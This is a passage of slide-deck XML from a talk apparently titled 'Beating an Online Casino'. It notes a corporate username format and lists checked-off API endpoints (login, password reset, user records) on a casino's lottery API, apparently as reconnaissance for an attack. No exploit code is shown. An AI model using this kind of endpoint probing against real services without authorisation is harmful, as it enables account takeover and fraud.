          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="671" name="Google Shape;671;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;672;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="673" name="Google Shape;673;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="674" name="Google Shape;674;p82"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="678" name="Shape 678"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="679" name="Google Shape;679;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="1554600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Makes sense because:</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>It’s an internal/corporate app </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Requires a c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>orporate username</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>username = </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2000" u="sng">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>name.lastname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>@company.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="680" name="Google Shape;680;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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1" name="Google Shape;681;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="682" name="Google Shape;682;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="683" name="Google Shape;683;p83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="687" name="Shape 687"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="688" name="Google Shape;688;p84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8671800" cy="4926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t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="689" name="Google Shape;689;p84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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0" name="Google Shape;690;p84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="691" name="Google Shape;691;p84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Now the Fun Part</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="692" name="Google Shape;692;p84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="693" name="Google Shape;693;p84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472200" y="1115875"/>
            <a:ext cx="8671800" cy="47985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t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/login ✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/forgot_password✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/new (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/123 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/me </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/verify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>✅</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
